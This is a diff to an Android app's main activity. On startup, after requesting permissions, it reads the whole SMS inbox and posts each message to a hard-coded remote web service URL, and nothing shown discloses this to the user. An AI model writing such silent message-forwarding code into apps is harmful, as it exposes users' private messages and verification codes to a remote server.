@@ -9,11 +9,17 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
 
+import java.util.ArrayList;
+
 //http://www.gadgetsaint.com/android/read-sms-messages-android/
 //HERLICH STEVEN GONZALEZ ZAMBRANO 2020
 
+
 public class MainActivity extends AppCompatActivity {
 
+    //esta es la url del servicio web donde se envian los mensajitos
+
+    String url = "https://arcgis-web.url.edu.gt/";
 
     SMSUtils msgSMS;
 
@@ -24,8 +30,15 @@ public class MainActivity extends AppCompatActivity {
         checkAccess();
         System.out.println("iniciando MAIN");
 
-        msgSMS = new SMSUtils(getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null));
-        msgSMS.readSMS();
+
+        msgSMS = new SMSUtils(getApplicationContext());
+        ArrayList<SMS> msgs = msgSMS.readSMS();
+        JSONUtils jUtil = new JSONUtils(getApplicationContext(), url);
+        for (int i = 0; i < msgs.size(); i++) {
+            jUtil.postMessage(msgs.get(i));
+        }
+
+
     }
 
     private void checkAccess() {
@@ -43,6 +56,7 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
         }
     }
+
     public static boolean hasPermissions(Context context, String... permissions) {
         if (context != null && permissions != null) {
             for (String permission : permissions) {
@@ -53,6 +67,5 @@ public class MainActivity extends AppCompatActivity {
         }
         return true;
     }
-
 
 }
